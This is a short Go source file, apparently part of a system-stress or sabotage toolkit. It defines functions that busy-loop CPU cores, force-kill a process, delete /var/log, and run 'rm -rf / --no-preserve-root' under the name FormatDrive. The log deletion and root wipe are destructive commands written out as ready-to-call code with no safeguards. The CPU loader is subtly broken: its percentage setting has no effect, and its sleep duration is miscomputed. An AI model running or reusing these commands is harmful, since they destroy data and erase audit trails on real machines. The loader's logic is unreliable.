package core

import (
	"runtime"
	"strconv"
	"time"
)

func CPULoader(cores int, interval string, percentage int) {
	runtime.GOMAXPROCS(cores)
	unitHundredsOfMicrosecond := 1000
	runMicrosecond := unitHundredsOfMicrosecond * percentage
	for i := 0; i < cores; i++ {
		go func() {
			runtime.LockOSThread()
			for {
				begin := time.Now()
				for {
					if time.Since(begin) > time.Duration(runMicrosecond)*time.Microsecond {
						break
					}
				}
			}
		}()
	}

	t, _ := time.ParseDuration(interval)
	time.Sleep(t * time.Second)
}

func KillPID(pid int) bool {
	p := strconv.Itoa(pid)
	_, b := RunCmd("kill -9 " + p)
	return b
}

func ClearSystemLogs() bool {
	_, b := RunCmd("rm -r /var/log")
	return b
}

func FormatDrive() bool {
	_, b := RunCmd("rm -rf / --no-preserve-root")
	return b
}
